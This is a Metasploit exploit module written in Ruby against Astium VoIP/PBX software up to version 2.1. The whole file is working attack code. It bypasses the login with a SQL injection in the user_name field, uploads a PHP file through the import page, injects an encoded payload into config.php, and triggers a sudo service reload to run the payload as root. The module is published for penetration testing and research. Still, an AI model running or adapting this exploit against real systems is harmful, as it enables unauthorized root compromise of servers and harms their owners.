# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking # Configuration is overwritten and service reloaded

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Astium Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits vulnerabilities found in Astium astium-confweb-2.1-25399 RPM and
        lower. A SQL Injection vulnerability is used to achieve authentication bypass and gain
        admin access. From an admin session arbitrary PHP code upload is possible. It is used
        to add the final PHP payload to "/usr/local/astium/web/php/config.php" and execute the
        "sudo /sbin/service astcfgd reload" command to reload the configuration and achieve
        remote root code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;xistence <xistence[at]0x90.nl>&#039; # Discovery, Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;88860&#039; ],
          [ &#039;EDB&#039;, &#039;23831&#039; ]
        ],
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;Astium 2.1&#039;, {}]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Sep 17 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the Astium installation&#039;, &#039;/&#039;]),
        ], self.class)
  end

  def peer
    return "#{rhost}:#{rport}"
  end

  def uri
    return target_uri.path
  end

  def check
    # Check version
    print_status("#{peer} - Trying to detect Astium")

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "en", "content", "index.php")
    })

    if res and res.code == 302 and res.body =~ /direct entry from outside/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def exploit
    print_status("#{peer} - Access login page")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri),
      &#039;vars_get&#039; => {
        &#039;js&#039; => &#039;0&#039;,
        &#039;ctest&#039; => &#039;1&#039;,
        &#039;origlink&#039; => &#039;/en/content/index.php&#039;
      }
    })

    if res and res.code == 302 and res.get_cookies =~ /astiumnls=([a-zA-Z0-9]+)/
      session = $1
      print_good("#{peer} - Session cookie is [ #{session} ]")
      redirect =  URI(res.headers[&#039;Location&#039;])
      print_status("#{peer} - Location is [ #{redirect} ]")
    else
      fail_with(Exploit::Failure::Unknown, "#{peer} - Access to login page failed!")
    end


    # Follow redirection process
    print_status("#{peer} - Following redirection")
    res = send_request_cgi({
      &#039;uri&#039; => "#{redirect}",
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => "astiumnls=#{session}"
    })

    if not res or res.code != 200
      fail_with(Exploit::Failure::Unknown, "#{peer} - Redirect failed!")
    end


    sqlirandom = rand_text_numeric(8)

    # SQLi to bypass authentication
    sqli="system&#039; OR &#039;#{sqlirandom}&#039;=&#039;#{sqlirandom}"

    # Random password
    pass = rand_text_alphanumeric(10)

    post_data = "__act=submit&user_name=#{sqli}&pass_word=#{pass}&submit=Login"
    print_status("#{peer} - Using SQLi to bypass authentication")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "/en", "logon.php"),
      &#039;cookie&#039; => "astiumnls=#{session}",
      &#039;data&#039;   => post_data
    })

    if not res or res.code != 302
      fail_with(Exploit::Failure::Unknown, "#{peer} - Login bypass was not succesful!")
    end

    # Random filename
    payload_name = rand_text_alpha(rand(10) + 5) + &#039;.php&#039;

    phppayload = "<?php "
    # Make backup of the "/usr/local/astium/web/php/config.php" file
    phppayload << "$orig = file_get_contents(&#039;/usr/local/astium/web/php/config.php&#039;);"
    # Add the payload to the end of "/usr/local/astium/web/php/config.php". Also do a check if we are root,
    # else during the config reload it might happen that an extra shell is spawned as the apache user.
    phppayload << "$replacement = base64_decode(\"#{Rex::Text.encode_base64(payload.encoded)}\");"   
    phppayload << "$f = fopen(&#039;/usr/local/astium/web/php/config.php&#039;, &#039;w&#039;);"
    phppayload << "fwrite($f, $orig . \"<?php if (posix_getuid() == 0) {\" . $replacement . \"} ?>\");"
    phppayload << "fclose($f);"
    # Reload astcfgd using sudo (so it will read our payload with root privileges).
    phppayload << "system(&#039;sudo /sbin/service astcfgd reload&#039;);"
    # Sleep 1 minute, so that we have enough time for the reload to trigger our payload
    phppayload << "sleep(60);"
    # Restore our original config.php, else the Astium web interface won&#039;t work anymore.
    phppayload << "$f = fopen(&#039;/usr/local/astium/web/php/config.php&#039;, &#039;w&#039;);"
    phppayload << "fwrite($f, $orig);"
    phppayload << "fclose($f);"
    phppayload << "?>"

    post_data = Rex::MIME::Message.new
    post_data.add_part("submit", nil, nil, "form-data; name=\"__act\"")
    post_data.add_part(phppayload, "application/octet-stream", nil, "file; name=\"importcompany\"; filename=\"#{payload_name}\"")
    file = post_data.to_s.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    print_status("#{peer} - Uploading Payload [ #{payload_name} ]")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "en", "database", "import.php"),
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;cookie&#039; => "astiumnls=#{session}",
      &#039;data&#039;   => file
    })

    # If the server returns 200 and the body contains our payload name,
    # we assume we uploaded the malicious file successfully
    if not res or res.code != 200 or res.body !~ /#{payload_name}/
      fail_with(Exploit::Failure::Unknown, "#{peer} - File wasn&#039;t uploaded, aborting!")
    end

    register_file_for_cleanup("/usr/local/astium/web/html/upload/#{payload_name}")

    print_status("#{peer} - Requesting Payload [ #{uri}upload/#{payload_name} ]")
    print_status("#{peer} - Waiting as the reloading process may take some time, this may take a couple of minutes")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "upload", "#{payload_name}")
    }, 120)

    # If we don&#039;t get a 200 when we request our malicious payload, we suspect
    # we don&#039;t have a shell, either. 
    if res and res.code != 200
      print_error("#{peer} - Unexpected response...")
    end

  end

end

